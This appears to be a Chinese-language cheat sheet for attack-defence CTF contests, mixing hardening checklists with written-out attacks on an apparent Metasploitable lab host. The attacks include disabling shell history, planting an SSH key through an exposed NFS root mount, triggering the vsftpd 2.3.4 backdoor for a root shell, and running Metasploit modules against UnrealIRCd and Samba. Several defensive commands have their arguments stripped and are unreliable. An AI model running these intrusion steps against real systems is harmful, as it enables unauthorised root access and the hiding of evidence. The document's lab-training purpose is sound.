## 准备
[reverse shell manager](https://github.com/WangYihang/Platypus)
[web shell manager](https://github.com/WangYihang/Webshell-Sniper)
* 备份www
* 备份passwd
* linux_check
* 修改默认口令 
* 配置waf，文件监控，日志记录 
* getflag所需命令改名
* 改cd ls curl wget常用命令
* /var/www/html/ 设置为不可写
* D盾扫后门
* chattr -i
## 防御
* netstat：端口，连接排查方法 
* 如何kill进程/防止kill
* 改rw/a权限
* 目录禁止写入
* 删解释器
* sql防注入代码
* 日志管理
* 文件监控
* umask?
* 网络端口监控
* waf过滤sqlmap  //sql改head
* 上传漏洞防护
* webshell扫描器
* linux后门发现chkrootkit
* 河马webshell查杀 http://www.shellpub.com/ 

## 攻击
* 提权脚本
* 白盒审计工具
* 批量端口扫描 http，爆破phpmyadmin ssh mysql
* 上传、权限维持脚本
* 扫描webshell,路径爆破
* 端口扫描
* Cain4.9 多口令破解测试
* arp欺骗工具
* Wordpress 综合检测工具?
* 各大cms get shell
* 后门批量上传，管理
* 后门开机启动 定时运行
* 自动化程度提高
* php 5.10 poc
* xss 打cookie
* 自动化攻击，提交
* 中国特色字典
* bash不记录历史记录

```
export HISTFILE=/dev/null
export HISTSILZ
```

```bash
lsb_release  -a
file /bin/ls
getconf LONG_BIT
cat /etc/issue
uname -a
whoami
ssh user@remote_server tail -f /var/log/apache2/access.log | ngxtop -f
ssh msfadmin@192.168.189.131 tail -f /var/log/apache2/access.log | ngxtop -f 
```
## 虚拟化判断
https://www.bboysoul.com/2017/11/08/%E6%8E%A8%E8%8D%90%E4%B8%80%E4%B8%AA%E5%8F%AF%E4%BB%A5%E5%88%A4%E6%96%AD%E4%BD%A0%E7%9A%84vps%E4%BD%BF%E7%94%A8%E4%BB%80%E4%B9%88%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E7%9A%84%E5%B7%A5%E5%85%B7/
    
https://people.redhat.com/~rjones/virt-what/

## 发现
angry ip scanner
nmap
msscan
## 常用命令

```shell
scp 文件路径 用户名@IP:存放路径
who 查看tty
pkill ‐kill ‐t <用户tty>
#查看已建立的网络连接及进程
netstat ‐antulp | grep EST
#查看指定端口被哪个进程占用
lsof ‐i:端口号 或者 netstat ‐tunlp|grep 端口号
#结束进程命令
kill PID
killall <进程名>
kill ‐ <PID>
#封杀某个IP或者ip段，如:.
iptables ‐I INPUT ‐s . ‐j DROP
iptables ‐I INPUT ‐s ./ ‐j DROP #禁止从某个主机ssh远程访问登陆到本机，如123..
iptable ‐t filter ‐A INPUT ‐s . ‐p tcp ‐‐dport ‐j DROP 
#备份mysql数据库
mysqldump ‐u 用户名 ‐p 密码 数据库名 > back.sql
mysqldump ‐‐all‐databases > bak.sql
#还原mysql数据库
mysql ‐u 用户名 ‐p 密码 数据库名 < bak.sql
find / *.php ‐perm
awk ‐F: /etc/passwd
crontab ‐l
#检测所有的tcp连接数量及状态
netstat ‐ant|awk |grep |sed ‐e ‐e |sort|uniq ‐c|sort ‐rn 
#查看页面访问排名前十的IP
cat /var/log/apache2/access.log | cut ‐f1 ‐d
r | head ‐
#查看页面访问排名前十的URL
cat /var/log/apache2/access.log | cut ‐f4 ‐d
r | head ‐
```
netstat ‐ant|awk |grep |sed ‐e ‐e |sort|uniq ‐c|sort ‐rn
win:netstat -no 查看网络链接
# 防御&&attack

## 防篡改

chattr +i /etc/profile
chattr -R +i /var/www/html
chattr +a /var/log 只能追加

## 进程检查

如果我们怀疑某个进程正在是受到溢出攻击后创建的shell进程，我们可以分析这个进程是否有socket连接，linux中查看指定进程socket 连接数的命令为:
比如我们查看ssh进程的socket连接。如果我们检测的程序有socket连接，说明它正在进行网络通信，我们就需要进行进一步判断。


## 检查nfs

rpcinfo -p 192.168.189.131
showmount -e
 mkdir /tmp/r00t

 mount -t nfs 192.168.99.131:/ /tmp/r00t/

 cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys 

 umount /tmp/r00t


 ssh root@192.168.99.131

## ftp ssh 配置文件检查

    telnet 192.168.99.131 21

    Trying 192.168.99.131…

    Connected to 192.168.99.131.

    Escape character is &#039;^]&#039;.

    220 (vsFTPd 2.3.4)

    user backdoored:)

    331 Please specify the password.

    pass invalid

    ^]

    telnet> quit

telnet 192.168.99.131 6200

Trying 192.168.99.131…

Connected to 192.168.99.131.

Escape character is &#039;^]&#039;.

id;

uid=0(root) gid=0(root)

## 6667端口上运行着UnreaIRCD IRC

 use exploit/unix/irc/unreal_ircd_3281_backdoor
 getshell

## ingreslock 后门

telnet 192.168.99.131 1524

## smb后门

配置为文件权限可写同时"wide links" 被允许（默认就是允许），同样可以被作为后门而仅仅是文件共享。下面例子里，metasploit提供一个攻击模块，允许接入一个root文件系统通过一个匿名接入和可写入的共享设置。
smbclient -L //192.168.99.131
 use auxiliary/admin/smb/samba_symlink_traversal 
 set RHOST 192.168.99.131
  set SMBSHARE tmp
  exploit 

 smbclient //192.168.99.131/tmp
 getshell
 
## dwa后门

Default username = admin
Default password = password

##php 漏洞
CVE–2012-1823和 CVE–2012-2311


# 查看页面访问排名前十的IP

netstat ‐ant|awk |grep |sed ‐e ‐e |sort|uniq ‐c|sort ‐rn 

http://bobao.360.cn/ctf/learning/210.html  
https://bbs.ichunqiu.com/thread-25092-1-1.html?from=aqzx2